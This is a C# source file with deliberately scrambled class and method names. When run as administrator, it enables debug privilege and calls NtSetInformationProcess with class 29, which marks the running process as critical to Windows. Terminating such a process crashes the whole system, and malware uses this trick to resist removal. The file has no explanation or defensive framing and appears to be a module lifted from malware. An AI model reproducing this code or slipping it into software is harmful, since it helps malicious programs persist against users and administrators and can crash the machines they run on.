using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace nLpTFjJRwUBp;

public static class rMwmbLdhsWQM
{
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr vbfnhcXQIznYGdg, int eHqUCIdihTdYW, ref int rqThwOPfPTwDvOp, int wBJayVXTxxGH);

	public static void GEEoZOnRFvWhH()
	{
		if (zCGynGELxJVkK())
		{
			HvwyJoEOMpEv();
		}
	}

	public static void HvwyJoEOMpEv()
	{
		int rqThwOPfPTwDvOp = 1;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref rqThwOPfPTwDvOp, 4);
	}

	public static bool zCGynGELxJVkK()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}
}
